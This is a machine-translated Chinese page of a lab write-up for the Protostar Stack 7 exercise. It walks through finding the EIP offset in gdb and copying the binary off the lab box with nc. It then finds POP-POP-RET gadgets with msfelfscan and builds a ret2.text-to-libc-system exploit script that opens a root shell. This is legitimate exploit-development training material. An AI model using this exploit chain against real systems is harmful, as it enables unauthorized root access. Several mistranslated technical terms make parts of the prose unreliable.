<html>
<head>
<title>[ExpDev] Exploit Exercise | Protostar | Stack 7</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">[ExpDev]漏洞利用练习|原恒星|堆栈7</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/expdev-exploit-exercise-protostar-stack-7-fea3ac85ffe7?source=collection_archive---------2-----------------------#2020-05-21">https://infosecwriteups.com/expdev-exploit-exercise-protostar-stack-7-fea3ac85ffe7?source=collection_archive---------2-----------------------#2020-05-21</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/5daa8834def48d98dfe4517172fa1f79.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*BzO7WyHjqxk4LNNb.png"/></div></div></figure><h1 id="aad3" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">堆栈7 (ret2.text)</h1><p id="8b14" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">此挑战的目标是绕过对返回地址的限制，并导致任意代码执行。对返回地址的限制将阻止我们使用任何以<code class="fe lx ly lz ma b">0xb</code>开头的地址。</p><p id="47e1" class="pw-post-body-paragraph kz la it lb b lc mb le lf lg mc li lj lk md lm ln lo me lq lr ls mf lu lv lw im bi translated">所以从<a class="ae mg" href="https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6" rel="noopener">栈6 </a>写起，由于我们无法使用栈中的任何地址(<code class="fe lx ly lz ma b">0xbf</code>)，我们利用ret2libc技术利用了一个libc小工具(位于<code class="fe lx ly lz ma b">0xb7</code>)。然而，对于栈7，我们也被限制一起使用位于<code class="fe lx ly lz ma b">0xb</code>的任何地址。</p><p id="41cb" class="pw-post-body-paragraph kz la it lb b lc mb le lf lg mc li lj lk md lm ln lo me lq lr ls mf lu lv lw im bi translated">为了避免这一点，我们将利用另一种称为return to的面向返回的编程(“ROP”)技术。文本(" ret2.text ")。</p><ul class=""><li id="71af" class="mh mi it lb b lc mb lg mc lk mj lo mk ls ml lw mm mn mo mp bi translated">链接:<a class="ae mg" href="https://exploit-exercises.lains.space/protostar/stack7/" rel="noopener ugc nofollow" target="_blank">https://exploit-exercises.lains.space/protostar/stack7/</a></li></ul><figure class="mr ms mt mu gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mq"><img src="../Images/b5ba61954296f4aa475765920b313d78.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*R1-xgF3sy_zTClujfIR1XA.png"/></div></div></figure><h2 id="b6ba" class="mv kc it bd kd mw mx dn kh my mz dp kl lk na nb kp lo nc nd kt ls ne nf kx ng bi translated">注意事项</h2><ul class=""><li id="a728" class="mh mi it lb b lc ld lg lh lk nh lo ni ls nj lw mm mn mo mp bi translated"><code class="fe lx ly lz ma b">gets(buffer);</code>:弱势群体。它从stdin中读取一行，但不检查缓冲区溢出→这容易受到BOF类型的攻击。</li><li id="1bb4" class="mh mi it lb b lc nk lg nl lk nm lo nn ls no lw mm mn mo mp bi translated"><code class="fe lx ly lz ma b">char buffer[64];</code>:这将我们的缓冲长度限制为64字节。→我们可以输入超过64个字节来引起BOF。</li><li id="405b" class="mh mi it lb b lc nk lg nl lk nm lo nn ls no lw mm mn mo mp bi translated"><code class="fe lx ly lz ma b">if((ret &amp; 0xb0000000) == 0xb0000000)</code>:这是对在<code class="fe lx ly lz ma b">0xb0000000 — 0xbfffffff</code>位置之间使用任何返回地址的限制。(请查看我的<a class="ae mg" href="https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6" rel="noopener"> Stack 6 </a>文章，了解程序是如何限制使用这些地址的。)</li></ul><figure class="mr ms mt mu gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi np"><img src="../Images/5af7b957d116c3906ebd9bf459f9e3a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2IxNWnLlhq24CRVaGUNACA.png"/></div></div></figure><h1 id="6144" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">漏洞利用(ret2.text)</h1><p id="ecea" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">为了规避这种类型的限制，我们可以利用ROP链攻击，特别是ret2.text技术。简单地说，由于我们对跳转到任何堆栈或libc地址都有限制，我们可以转而跳转到程序的<code class="fe lx ly lz ma b">.text</code>部分(=程序的ASM代码所在的地方)并利用一个特殊的小工具(=以<code class="fe lx ly lz ma b">POP, POP, RET</code>的<code class="fe lx ly lz ma b">RET</code>结尾的一小段指令序列)来获得代码执行。</p><p id="db6e" class="pw-post-body-paragraph kz la it lb b lc mb le lf lg mc li lj lk md lm ln lo me lq lr ls mf lu lv lw im bi translated">为此，我们需要具备以下先决条件:</p><ol class=""><li id="9587" class="mh mi it lb b lc mb lg mc lk mj lo mk ls ml lw nq mn mo mp bi translated">✅获得对筹码的完全控制权<code class="fe lx ly lz ma b">EIP</code>。</li><li id="f0fa" class="mh mi it lb b lc nk lg nl lk nm lo nn ls no lw nq mn mo mp bi translated">✅在程序上找到可用的<code class="fe lx ly lz ma b">POP, POP, RET</code>小工具。</li><li id="38a3" class="mh mi it lb b lc nk lg nl lk nm lo nn ls no lw nq mn mo mp bi translated">需要禁用✅数据执行保护(“DEP”)。</li></ol><h2 id="16a6" class="mv kc it bd kd mw mx dn kh my mz dp kl lk na nb kp lo nc nd kt ls ne nf kx ng bi translated">寻找EIP偏移</h2><p id="daba" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">让我们创建一个python脚本来找到我们可以控制的偏移值<code class="fe lx ly lz ma b">EIP</code>:</p><pre class="mr ms mt mu gt nr ma ns nt aw nu bi"><span id="d882" class="mv kc it ma b gy nv nw l nx ny">#!/usr/bin/python</span><span id="e585" class="mv kc it ma b gy nz nw l nx ny">padding = "A" * 70<br/>padding+= "BBBBCCCCDDDDEEEEFFFFGGGG"</span><span id="8a81" class="mv kc it ma b gy nz nw l nx ny">print padding</span></pre><p id="213c" class="pw-post-body-paragraph kz la it lb b lc mb le lf lg mc li lj lk md lm ln lo me lq lr ls mf lu lv lw im bi translated">然后，在一个文件中创建一个漏洞利用的输出，以便我们可以用gdb运行它。</p><pre class="mr ms mt mu gt nr ma ns nt aw nu bi"><span id="9a1d" class="mv kc it ma b gy nv nw l nx ny">$ python exploit.py &gt; /tmp/stack7/exploit</span></pre><p id="2d88" class="pw-post-body-paragraph kz la it lb b lc mb le lf lg mc li lj lk md lm ln lo me lq lr ls mf lu lv lw im bi translated">现在，运行gdb并提供漏洞文件。</p><pre class="mr ms mt mu gt nr ma ns nt aw nu bi"><span id="235a" class="mv kc it ma b gy nv nw l nx ny"><strong class="ma iu">$ gdb -q stack7</strong><br/>  Reading symbols from /opt/protostar/bin/stack7...done.<br/><strong class="ma iu">(gdb) break * main</strong><br/>  Breakpoint 1 at 0x804854b: file stack7/stack7.c, line 28.<br/><strong class="ma iu">(gdb) run &lt; /tmp/stack7/exploit</strong><br/>  Starting program: /opt/protostar/bin/stack7 &lt; /tmp/stack7/exploit</span><span id="4843" class="mv kc it ma b gy nz nw l nx ny">  Breakpoint 1, main (argc=1, argv=0xbffff854) at stack7/stack7.c:28<br/>  28 in stack7/stack7.c<br/><strong class="ma iu">(gdb) continue</strong><br/>  Continuing.<br/>  input path please: got path<br/>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADDEEAABBBBCCCCDDDDEEEEFFFFGGGG</span><span id="ac63" class="mv kc it ma b gy nz nw l nx ny">  Program received signal SIGSEGV, Segmentation fault.<br/><strong class="ma iu">  0x45454444</strong> in ?? ()</span></pre><p id="7b25" class="pw-post-body-paragraph kz la it lb b lc mb le lf lg mc li lj lk md lm ln lo me lq lr ls mf lu lv lw im bi translated">“0x44”和“0x45”在ASCII表示中分别是“D”和“E”。因此，偏移量为80 (= 70 + "BBBBCCCCDD ")。</p><pre class="mr ms mt mu gt nr ma ns nt aw nu bi"><span id="aa75" class="mv kc it ma b gy nv nw l nx ny"><strong class="ma iu">...<br/>(gdb) continue</strong><br/>  Continuing.  Program received signal SIGSEGV, Segmentation fault.<br/>  <strong class="ma iu">0x44444343 </strong>in ?? ()                             <br/><strong class="ma iu">(gdb) info registers<br/>  </strong>eax            0x804a008 134520840<br/>  ecx            0x0 0<br/>  edx            0x3 3<br/>  ebx            0xb7fd7ff4 -1208123404<br/>  esp            0xbffff7a0 0xbffff7a0<br/>  ebp            0x44444343 0x44444343<br/>  esi            0x0 0<br/>  edi            0x0 0<br/>  <strong class="ma iu">eip            0x45454444 0x45454444       &lt;---- EIP Overflowed</strong><br/>  eflags         0x210206 [ PF IF RF ID ]</span></pre><p id="92e1" class="pw-post-body-paragraph kz la it lb b lc mb le lf lg mc li lj lk md lm ln lo me lq lr ls mf lu lv lw im bi translated">此外，现在我们可以在崩溃时控制<code class="fe lx ly lz ma b">EIP</code>,这意味着我们可以跳转到堆栈中我们希望的任何位置。</p><h2 id="0d44" class="mv kc it bd kd mw mx dn kh my mz dp kl lk na nb kp lo nc nd kt ls ne nf kx ng bi translated">查找POP POP RET小工具</h2><p id="2950" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">网站上的提示说，我们可以很容易地利用名为“msfelfscan”的工具获得合适的指令。让我们先把栈7转移到我们的盒子里。</p><pre class="mr ms mt mu gt nr ma ns nt aw nu bi"><span id="fe3f" class="mv kc it ma b gy nv nw l nx ny"><strong class="ma iu">### Moving Stack7</strong></span><span id="c185" class="mv kc it ma b gy nz nw l nx ny"><strong class="ma iu">## On your Kali box</strong><br/>$ nc -lvnp 8000 &gt; stack7</span><span id="b6d8" class="mv kc it ma b gy nz nw l nx ny"><strong class="ma iu">## On the Protostar box</strong><br/>$ nc 192.168.117.144 8000 &lt; /opt/protostar/bin/stack7</span></pre><p id="fd9f" class="pw-post-body-paragraph kz la it lb b lc mb le lf lg mc li lj lk md lm ln lo me lq lr ls mf lu lv lw im bi translated">一旦它被传输到您的盒子，运行“msfelfscan”来找到<code class="fe lx ly lz ma b">POP, POP, RET</code>小工具。</p><pre class="mr ms mt mu gt nr ma ns nt aw nu bi"><span id="9dc6" class="mv kc it ma b gy nv nw l nx ny"><strong class="ma iu">### msfelfscan</strong></span><span id="4586" class="mv kc it ma b gy nz nw l nx ny">$ /usr/share/framework2/msfelfscan -s -f stack7<br/><strong class="ma iu">0x080485c7   edi ebp ret<br/>0x08048492   ebx ebp ret<br/>0x080485f7   ebx ebp ret</strong></span></pre><h2 id="0a1c" class="mv kc it bd kd mw mx dn kh my mz dp kl lk na nb kp lo nc nd kt ls ne nf kx ng bi translated">漏洞脚本</h2><p id="47af" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">所以现在我们有了上面的3个<code class="fe lx ly lz ma b">POP, POP, RET</code>小工具地址(这3个地址中的任何一个都同样有效)。这种黑魔法是这样运作的:</p><pre class="mr ms mt mu gt nr ma ns nt aw nu bi"><span id="325b" class="mv kc it ma b gy nv nw l nx ny"><strong class="ma iu">### 🚨 Exploit Execution Flow</strong></span><span id="1ebd" class="mv kc it ma b gy nz nw l nx ny">1) Padding = "A" * 80<br/>2) EIP =<strong class="ma iu"> 0x080485c7 </strong>(POP, POP, RET)<br/>3) POP = 4 bytes of junk<br/>4) POP = 4 bytes of junk<br/>5) RET = <strong class="ma iu">**JMP to the address that we wish to**<br/>         [Option #1] </strong>"\x90" * 80 + shellcode of /bin/sh<strong class="ma iu"><br/>         [Option #2] </strong>libc /bin/sh syscall</span></pre><p id="38e1" class="pw-post-body-paragraph kz la it lb b lc mb le lf lg mc li lj lk md lm ln lo me lq lr ls mf lu lv lw im bi translated">让我们把一切放在一起，创造我们的利用。我们将使用<strong class="lb iu">【选项# 2】</strong>方法以root用户身份获得shell访问权限:</p><pre class="mr ms mt mu gt nr ma ns nt aw nu bi"><span id="62a6" class="mv kc it ma b gy nv nw l nx ny"><strong class="ma iu">[exploit.py]</strong></span><span id="974e" class="mv kc it ma b gy nz nw l nx ny">#!/bin/usr/python</span><span id="6d07" class="mv kc it ma b gy nz nw l nx ny">import struct</span><span id="e19c" class="mv kc it ma b gy nz nw l nx ny">padding = "A" * 80<br/>padding+= "\xc7\x85\x04\x08"          <strong class="ma iu"># 0x080485c7 (POP, POP, RET)</strong><br/>padding+= "BBBB"                      <strong class="ma iu"># 1st POP w/ junk</strong><br/>padding+= "CCCC"                      <strong class="ma iu"># 2nd POP w/ junk</strong></span><span id="93e2" class="mv kc it ma b gy nz nw l nx ny"><strong class="ma iu"># Using the following to confirm code execution for SIGTRA</strong>P<br/>#padding+= "\xd8\xf7\xff\xbf"         <strong class="ma iu"># 0xbffff7d8 (Middle of NOP)</strong><br/>#padding+= "\x90" * 80<br/>#padding+= "\xCC" * 4                 <strong class="ma iu"># int3 to cause SIGTRAP</strong></span><span id="6fcd" class="mv kc it ma b gy nz nw l nx ny"><strong class="ma iu"># libc /bin/sh (*Check </strong><a class="ae mg" href="https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6" rel="noopener"><strong class="ma iu">Stack6</strong></a><strong class="ma iu"> to see how I got those addresses)</strong><br/>system = struct.pack("I", 0xb7ecffb0)<br/>ret = "\x90" * 4<br/>shell = struct.pack("I", 0xb7e97000 + 0x11f3bf)</span><span id="06fe" class="mv kc it ma b gy nz nw l nx ny">print padding + system + ret + shell</span></pre><p id="f25a" class="pw-post-body-paragraph kz la it lb b lc mb le lf lg mc li lj lk md lm ln lo me lq lr ls mf lu lv lw im bi translated">一旦我们使用<code class="fe lx ly lz ma b">cat</code>技巧运行上述漏洞利用脚本，无需引入任何外壳代码，我们就可以成功地打开一个具有root权限的<code class="fe lx ly lz ma b">/bin/sh</code>外壳。</p><pre class="mr ms mt mu gt nr ma ns nt aw nu bi"><span id="482c" class="mv kc it ma b gy nv nw l nx ny">$ (python /tmp/stack7/exploit.py; cat) | ./stack7</span></pre><figure class="mr ms mt mu gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oa"><img src="../Images/4dbd025722592becf78957eb1d3368fa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ez0hd2Q_yJXEsd6yKqy0NA.png"/></div></div></figure><p id="6137" class="pw-post-body-paragraph kz la it lb b lc mb le lf lg mc li lj lk md lm ln lo me lq lr ls mf lu lv lw im bi translated">感谢阅读！</p><h2 id="15f7" class="mv kc it bd kd mw mx dn kh my mz dp kl lk na nb kp lo nc nd kt ls ne nf kx ng bi translated">下一个挑战:</h2><ul class=""><li id="d761" class="mh mi it lb b lc ld lg lh lk nh lo ni ls nj lw mm mn mo mp bi translated"><a class="ae mg" href="https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-format-0-332983bfd388" rel="noopener"> <strong class="lb iu">格式0 </strong> </a> —格式字符串开发简介</li></ul><figure class="mr ms mt mu gt ju gh gi paragraph-image"><div class="gh gi ob"><img src="../Images/29d7b05693983916f565e42fc1ce4afe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1346/format:webp/0*n8WTo7Tl2XOpfhfY.png"/></div></figure></div></div>    
</body>
</html>